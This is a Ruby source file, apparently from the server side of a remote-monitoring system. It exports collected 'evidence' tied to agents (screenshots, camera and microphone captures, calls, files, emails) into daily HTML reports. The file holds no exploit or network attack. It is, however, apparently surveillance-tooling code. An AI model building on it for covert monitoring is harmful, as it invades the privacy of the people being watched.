# encoding: UTF-8
require 'cgi'
require 'rcs-common/utf16le'
require_relative '../tasks'

module RCS
  module DB
    class EvidenceTemplate < OpenStruct
      def initialize attributes = {}
        @template_name = attributes.delete(:name)
        super(attributes)
      end

      # Render self OR another template
      def render name = nil, params = {}
        if name.blank?
          template_path = File.join File.dirname(__FILE__), 'evidence', "#{@template_name}.erb"
          template = ERB.new File.new(template_path).read, nil, "%"
          template.result(binding)
        else
          render_template(name, params)
        end
      end

      # Helpers that can be used in erb files

      def render_template name, params = {}
        self.class.new(params.merge(name: name)).render
      end

      def html_image(image, size=140)
        "<a href=\"#{image}\"><img src=\"#{image}\" height=\"#{size}\" ></a>"
      end

      def html_mp3_player(mp3)
        "<audio src=\"#{mp3}\" controls>HTML5 audio not supported</audio><a href=\"#{mp3}\" title=\"Download\">[+]</a>"
      end
    end

    class EvidenceTask
      include RCS::DB::MultiFileTaskType
      include RCS::Tracer

      def internal_filename
        'evidence.html'
      end

      def total
        num = ::Evidence.report_count @params
        trace :info, "Exporting #{num} evidence..."
        return num
      end

      def next_entry
        @description = "Exporting #{@total} evidence"
        evidence = ::Evidence.report_filter @params

        @display_notes = (@params['note'] == false) ? false : true

        export(evidence, index: :da, target: @params['filter']['target']) do |type, filename, opts|
          yield type, filename, opts
        end

        yield @description = "Ended"
      end

      ######################################################################################################

      def render name, params = {}
        EvidenceTemplate.new(params.merge(name: name)).render
      end

      # In case of single-agent export
      def agent_description
        @agent_description ||= begin
          return unless @params['filter']['agent']
          agent = Item.agents.find(@params['filter']['agent'])
          ["#{agent.name} (#{agent.instance})", agent.desc].reject(&:blank?).join(" - ")
        end
      end

      def begin_new_file(day)
        out = {}
        out[:name] = File.join(day, 'index.html')
        out[:content] = render(:header)
        day += ", exported by agent #{agent_description}" if agent_description
        out[:content] << render(:table_header, day: day, display_notes: @display_notes)
        out
      end

      def end_file(out)
        out[:content] << render(:table_footer)
        out[:content] << render(:footer)
      end

      def dump_filename(day, evidence, target)
        name = evidence[:data]['_grid'].to_s
        case evidence[:type]
          when 'screenshot', 'camera', 'mouse', 'print'
            name << '.jpg'
          when 'call', 'mic'
            name << '.mp3'
          when 'file'
            name << File.extname(evidence[:data]['path'])
          when 'message'
            if evidence[:data]['type'] == :mail
              name << '.eml'
            end
        end
        name
      end

      def dump_file(day, grid_id, name, target)
        file = GridFS.to_tmp grid_id, target
        return File.join(day, name), file
      end

      def export(evidence, opts)
        # expand the sytles in the dest dir
        FileTask.expand_styles do |name, content|
          yield 'stream', name, {content: content}
        end

        # the current file handler
        out = nil

        # date of the current file
        file_day = nil

        summary = {}

        # to avoid cursor timeout on server-side
        # we split the query into different small chunks
        # so the cursor should be recreated every query

        chunk = 100
        cursor = 0
        total = evidence.count

        first_element = true
        while cursor < total do

          grid_dumps = []
          trace :info, "Exporting evidence: #{total - cursor} evidence to go..."

          evidence.limit(chunk).skip(cursor).each_with_index do |e, i|
            # get the day of the current evidence
            day = Time.at(e[opts[:index]]).strftime('%Y-%m-%d')
            # get the hour of the evidence
            hour = Time.at(e[opts[:index]]).strftime('%H').to_i

            # this is the first element
            if first_element
              first_element = false
              file_day = day
              out = begin_new_file day
              summary[day] = Array.new(24, 0)
            end

            # if the date of the file is different from the day of the evidence
            # we need to begin a new file
            if file_day != day
              # close any pending file / table
              end_file out

              # store the file
              yield 'stream', out[:name], {content: out[:content]}

              # create a new file
              out = begin_new_file day
              # remember the day of the file for the next iteration
              file_day = day
              summary[day] = Array.new(24, 0)
            end

            begin
              agent = ::Item.find(e[:aid])
              e[:agent] = agent.name
              e[:agent_instance] = agent.instance
            rescue
              e[:agent] = 'unknown'
              e[:agent_instance] = 'unknown'
            end

            # write the current evidence
            begin
              out[:content] << render(:table_row, row: e, display_notes: @display_notes)
            rescue Exception => ex
              trace :fatal, "#{ex.class} #{ex.message} #{e.inspect}"
            end

            # if the log does not have grid, yield it now, else add to the queue (it will be yielded later)
            if e[:data]['_grid'].nil?
              yield
            else
              # add grid exports to queue
              grid_dumps << {day: day, id: e[:data]['_grid'], file_name: dump_filename(day, e, opts[:target]), target: opts[:target]}
            end

            # update the stat of the summary
            summary[day][hour] +=  1

          end

          grid_dumps.each do |g|
            begin
              filename, file = dump_file(g[:day], g[:id], g[:file_name], g[:target])
              yield 'file', filename, {path: file}
              FileUtils.rm_rf(file)
            rescue Exception => e
              trace :debug, "failed exporting file #{g[:id].inspect} to #{g[:file_name]}"
              next
            end
          end

          cursor += chunk
        end

        # this is the last element
        unless first_element
          end_file out
          yield 'stream', out[:name], {content: out[:content]}
        end

        # create the total summary of the exported evidence
        out = {name: 'index.html', content: render(:index, summary: summary)}
        yield 'stream', out[:name], {content: out[:content]}
      end
    end
  end # DB
end # RCS
